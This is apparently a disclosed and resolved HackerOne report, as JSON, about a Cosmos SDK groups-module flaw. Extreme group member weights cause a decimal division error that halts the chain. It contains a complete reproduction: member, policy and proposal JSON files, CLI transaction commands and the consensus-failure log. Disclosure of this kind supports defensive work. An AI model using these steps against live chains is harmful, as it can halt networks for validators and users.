{
  "id": 3018307,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMDE4MzA3",
  "url": "https://hackerone.com/reports/3018307",
  "title": "Groups module can halt chain when handling a proposal with malicious group weights ",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "high",
  "readable_substate": "Resolved",
  "created_at": "2025-02-28T12:59:53.492Z",
  "submitted_at": "2025-02-28T12:59:54.445Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "vakzz",
    "url": "/vakzz",
    "profile_picture_urls": {
      "small": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/variants/6zbovkumst7oljmo9v21pig3yh9j/727634197f209244e4307a490cdcd36c76d6e37fef1b0c164bd35ac010105f99?response-content-disposition=inline%3B%20filename%3D%2294971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg%22%3B%20filename%2A%3DUTF-8%27%2794971b5a75a669ea52903c09fc847f3434930258211181557be06162f5a8bac0.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ434G3WEH%2F20250704%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250704T195944Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECsaCXVzLXdlc3QtMiJGMEQCIEcfmhF7h2zOLHwUDmzMdlcClFgdfKsRFlAYd7BgrHV0AiAskAft51CapsS8hSVT1kmv3rgs9ZwzrSV6aOvOaV9BiCqxBQgzEAMaDDAxMzYxOTI3NDg0OSIMwjnjZx3jLSHxAyqRKo4FCQ57VpkOSg7otlVYQZU7FZSt9kqnDYVmON3lEvuuaYoL%2FMNBGesLkfrcD%2Fkd3NtRkFCFAb2nrzk636hTQYyPHicR4eVKwZgRQoJ2Z3AjVXGp8EruFgrqkOE%2BaRmK1AFwCagk5OHX5GHABc%2FHSRn%2FJX3%2BMK1LH0N5FI9yej6Ou5LbG3snIRUtZZnZlMifleBJOv92YeyOve%2BUpfWDAv%2BjvXOPCmTEogDTkhMGv2YXfLNP4o%2FQCCVzOEgO%2B9gD1Jz7X1%2B4ZbLrSks0Axsk1CImb3n%2B50t0WE2cwvsfnzl8W0xaA9h0gpjP3id%2BYg7OZprPH%2B0fE3jari9rEobRZArweGOilOEVfpPgKYc3mo3rao58FJ5hKfYvzTo4tywDjHdNOWPltMzJqLQ6PB4tkD8iiJtCJ6vNUmr3k%2FoWz0Ac6bBWb2GIYLnGjjLOJqC1Lqr%2FEiAf8N4ztdlVDFg%2By%2BNH%2FbTqQd5IpLDE0fCixqphHimZgCqJZSmb7lhgPK0ZQe3mhXCAPGYXsut%2BUOm%2Bvp60SYHaq0c4Gj0jjC%2BwPK0h8OBXd2x7wYRIfrh6JDzHX32HZYelVSS0TNj2FSD9YgALHtSCA1yQ%2FUY8ei2q65kIkLhAJfZ0pvONaFaUsEaqoyi1Ou0nXORGknqMb3377XVv6TXbeCaMQqUozBRPnNrUzBOghxvNsZYsQaV0Legh24kTa4c0MjtnIwRUiWH7l5mbB0BFuO1HAHHB1MM0p6m9PQuLZPUw8LYgNcSpCwx%2FKHPLim1KcUcx%2F0XWTWu6JOjJe02DMOx6FFqphFkhqvR35j3LQYhJQPoxjQa2Cp87XPUw6GBY0bob%2BjTKFmoOuGobXdYAAMAJ5GQFFNcOkuyqMJm2oMMGOrIBBK2VZxoWzlDpjMXUSjyg4MfvQ97RB3FPf8bcozgodbb9aUtj70VYqgS1r28nmIYvdqms1o4%2BcJIEhraMnoL6HmiZB%2F26KFYniKSwcx%2BJDIJnI8a38cWyR6rY7KgQ4lswSZH0QjT77%2BAvUPl9wO8Xkm9JsYTqjzrqaaAid7uXY9ShBqRN4%2F5ehQWlC4M%2BFh%2BvHUUYgVYcxyDqqinAdCWj1%2BDYGcsOPRZBwLSo3iMFE3liHA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1a25ca594a994e8e4362dd331c5a99c78c7891bcd095414322defbb30f5125e5"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 24626,
    "url": "https://hackerone.com/cosmos",
    "handle": "cosmos",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/l8innmct0qu74b6xv2jzvh5lk5ap/36bca6668139d77be42208d896968344ae7a76c55ee0f8b0f28281ccd492ff02",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/l8innmct0qu74b6xv2jzvh5lk5ap/19c85a12ac35f466af1ea2b0ae853bfe5e8f057fb1d6fb62db131707bb67b30d"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "Cosmos",
      "twitter_handle": "cosmos",
      "website": "https://interchain.io/",
      "about": "The Internet of Blockchains."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2025-04-23T23:00:29.126Z",
  "bug_reporter_agreed_on_going_public_at": "2025-03-24T23:00:27.448Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "### Summary of Impact\n\nAfter having a look into the patch for https://github.com/cosmos/cosmos-sdk/security/advisories/GHSA-x5vx-95h7-rv4p I discovered a very similar bug.\n\nThe original error was due to a divide by zero at https://github.com/cosmos/cosmos-sdk/blob/v0.50.12/x/group/types.go#L215 when the total power was zero.\n\n```go\nyesPercentage, err := yesCount.Quo(totalPowerDec)\n```\n\nThe patch prevented groups from having zero power and also added a guard to the division:\n```go\nif totalPowerDec.IsZero() {\n        return DecisionPolicyResult{Allow: false, Final: true}, nil\n}\nyesPercentage, err := yesCount.Quo(totalPowerDec)\n```\n\nThe issue is that there are other ways that `Quo` can fail, such as if the exponent of the resulting value is out of range:\nhttps://github.com/cockroachdb/apd/blob/master/decimal.go#L293-L309\n```golang\n// setExponent sets d's Exponent to the sum of xs. Each value and the sum\n// of xs must fit within an int32. An error occurs if the sum is outside of\n// the MaxExponent or MinExponent range. res is any Condition previously set\n// for this operation, which can cause Underflow to be set if, for example,\n// Inexact is already set.\nfunc (d *Decimal) setExponent(c *Context, res Condition, xs ...int64) Condition {\n    var sum int64\n    for _, x := range xs {\n        if x > MaxExponent {\n            return SystemOverflow | Overflow\n        }\n        if x < MinExponent {\n            return SystemUnderflow | Underflow\n        }\n        sum += x\n    }\n    r := int32(sum)\n```\n\nSince there are no limits on group member weight, it's possible to trigger this failure by having two members with weights of `\"1e-50000\"` and `\"1e50000\"`. If the user with the tiny weight votes yes, `yesCount.Quo(totalPowerDec)` will return an error `decimal quotient error: exponent out of range` and cause a chain halt when `doTallyAndUpdate` is called from the EndBlocker.\n\n### Steps to Reproduce\nCreate a new chain with ignite:\n```bash\nignite scaffold chain example\ncd example\nignite chain serve\n\n#  Cosmos SDK's version is: v0.50.12\n```\n\nCreate the following two json files using the addressed created by ignite server:\n\nmembers.json\n```json\n{\n    \"members\": [\n        {\n            \"address\": \"cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0\",\n            \"weight\": \"1e-50000\"\n        },\n        {\n            \"address\": \"cosmos18v59wacnwz89qphdez62m6nn7qse8mgfr7m0lk\",\n            \"weight\": \"1e50000\"\n        }\n    ]\n}\n```\n\npolicy.json\n```json\n{\n    \"@type\": \"/cosmos.group.v1.PercentageDecisionPolicy\",\n    \"percentage\": \"0.5\",\n    \"windows\": {\n        \"voting_period\": \"10s\",\n        \"min_execution_period\": \"20s\"\n    }\n}\n```\n\nCreate the group and transfer some funds to the policy address for testing:\n\n```bash\nexampled tx group create-group-with-policy cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0 \"\" \"\" members.json policy.json --gas auto --yes\nexampled q group group-policies-by-admin cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0\nexampled tx bank send cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0 cosmos17pmq7hp4upvmmveqexzuhzu64v36re3w3447n7dt46uwp594wtpsqv4fn5 100stake --gas auto --yes\n```\n\nCreate a new proposal file:\n\nproposal.json\n```\n{\n    \"group_policy_address\": \"cosmos17pmq7hp4upvmmveqexzuhzu64v36re3w3447n7dt46uwp594wtpsqv4fn5\",\n    \"messages\": [\n        {\n            \"@type\": \"/cosmos.bank.v1beta1.MsgSend\",\n            \"from_address\": \"cosmos17pmq7hp4upvmmveqexzuhzu64v36re3w3447n7dt46uwp594wtpsqv4fn5\",\n            \"to_address\": \"cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0\",\n            \"amount\": [\n                {\n                    \"denom\": \"stake\",\n                    \"amount\": \"10\"\n                }\n            ]\n        }\n    ],\n    \"metadata\": \"\",\n    \"title\": \"crash\",\n    \"summary\": \"crash\",\n    \"proposers\": [\n        \"cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0\"\n    ]\n}\n```\n\nSubmit and vote for the proposal\n```\nexampled tx group submit-proposal proposal.json --gas auto --yes\nexampled tx group vote 1 cosmos14xzyhnr8w098awcf8l6t57qw3qlhcwsntytvm0 VOTE_OPTION_YES \"\" --gas auto --yes\n```\n\nChain halts:\n```\n[EXAMPLED] 11:20PM ERR error in proxyAppConn.FinalizeBlock err=\"doTallyAndUpdate: policy allow: decimal quotient error: exponent out of range\" module=state\n[EXAMPLED] 11:20PM ERR CONSENSUS FAILURE!!! err=\"failed to apply block; error doTallyAndUpdate: policy allow: decimal quotient error: exponent out of range [cockroachdb/apd/v2@v2.0.2/condition.go:107]\" module=consensus stack=\"goroutine 80 [running]:\\nruntime/debug.Stack()\\n\\t/opt/homebrew/Cellar/go/1.23.2/libexec/src/runtime/debug/stack.go:26 +0x64\\ngithub.com/cometbft/cometbft/consensus.(*State).receiveRoutine.func2()\\n\\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:801 +0x4c\\npanic({0x109639ae0?, 0x14001246280?})\\n\\t/opt/homebrew/Cellar/go/1.23.2/libexec/src/runtime/panic.go:785 +0xf0\\ngithub.com/cometbft/cometbft/consensus.(*State).finalizeCommit(0x14001751c08, 0x5c6)\\n\\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:1781 +0x1030\\ngithub.com/cometbft/cometbft/consensus.(*State).tryFinalizeCommit(0x14001751c08, 0x5c6)\\n\\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:1682 +0x2c0\\ngithub.com/cometbft/cometbft/consensus.(*State).enterCommit.func1()\\n\\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:1617 +0xb8\\ngithub.com/cometbft/cometbft/consensus.(*State).enterCommit(0x14001751c08, 0x5c6, 0x0)\\n\\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:1655 +0xd90\\ngithub.com/cometbft/cometbft/consensus.(*State).addVote(0x14001751c08, 0x14002549040, {0x0, 0x0})\\n\\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:2343 +0x2a58\\ngithub.com/cometbft/cometbft/consensus.(*State).tryAddVote(0x14001751c08, 0x14002549040, {0x0, 0x0})\\n\\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:2067 +0x50\\ngithub.com/cometbft/cometbft/consensus.(*State).handleMsg(0x14001751c08, {{0x109ca2080, 0x140017185d0}, {0x0, 0x0}})\\n\\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:929 +0x5c0\\ngithub.com/cometbft/cometbft/consensus.(*State).receiveRoutine(0x14001751c08, 0x0)\\n\\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:856 +0x5fc\\ncreated by github.com/cometbft/cometbft/consensus.(*State).OnStart in goroutine 1\\n\\t/Users/will/go/pkg/mod/github.com/cometbft/cometbft@v0.38.17/consensus/state.go:398 +0x1e4\\n\"\n[EXAMPLED] 11:20PM INF service stop impl=baseWAL module=consensus msg=\"Stopping baseWAL service\" wal=/Users/will/.example/data/cs.wal/wal\n[EXAMPLED] 11:20PM INF service stop impl=Group module=consensus msg=\"Stopping Group service\" wal=/Users/will/.example/data/cs.wal/wal\n[EXAMPLED] 11:20PM INF Timed out dur=1000 height=1478 module=consensus round=0 step=RoundStepPropose\n```\n\n### Workarounds\nI think a patch/update will need to be applied to fix the issue.\n\n### Supporting Material/References\nCriticality: High (Considerable Impact; Likely Likelihood per [ACMv1.2](https://github.com/interchainio/security/blob/main/resources/CLASSIFICATION_MATRIX.md))\nAffected users: Validators, Full nodes, Users on chains that utilize the groups module\n\n## Impact\n\nA malicious user that can interact with the groups module can cause the entire chain to halt. Any chain that utilizes the groups module is affected.",
  "bounty_amount": "15000.0",
  "formatted_bounty": "$15,000",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2025-04-23T23:00:27.609Z",
  "allow_singular_disclosure_after": -6209956.494140873,
  "singular_disclosure_allowed": true,
  "vote_count": 76,
  "voters": [
    "renniepak",
    "n1m0",
    "alp",
    "m0chan",
    "zy9ard3",
    "alejandroar",
    "setuid",
    "ayux",
    "2026",
    "spaghettisec",
    "and 66 more..."
  ],
  "severity": {
    "rating": "high",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 562113,
    "asset_type": "OTHER",
    "asset_identifier": "Cosmos SDK",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
